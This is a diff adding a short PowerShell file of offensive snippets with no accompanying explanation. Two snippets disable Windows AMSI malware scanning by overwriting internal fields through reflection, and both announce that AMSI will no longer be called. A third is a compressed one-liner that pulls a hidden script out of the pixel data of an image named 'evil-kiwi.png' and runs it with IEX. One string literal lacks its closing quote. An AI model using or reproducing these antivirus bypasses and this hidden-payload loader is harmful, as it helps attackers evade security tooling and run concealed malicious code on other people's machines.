@@ -1,0 +1,17 @@
+$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') # get `amsi.dll` handle
+$field = $amsi.GetField('amsiInitFailed','NonPublic,Static') # get `amsiInitFailed` field
+$field.SetValue($null,$true) # set it to `$true`
+Write-host -ForegroundColor green "AMSI won't be called anymore"
+
+
+._______________
+
+
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) # allocate some memory
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null) # overwrite `amsiSession`
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem) # overwrite `amsiContext`
+Write-host -ForegroundColor green "AMSI won't be called anymore
+
+_____
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap(".\evil-kiwi.png");$o=a Byte[] 193536;(0..191)|%{​​​​foreach($x in(0..1007)){​​​​$p=$g.GetPixel($x,$_);$o[$_*1008+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}​​​​}​​​​;$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..192822]))
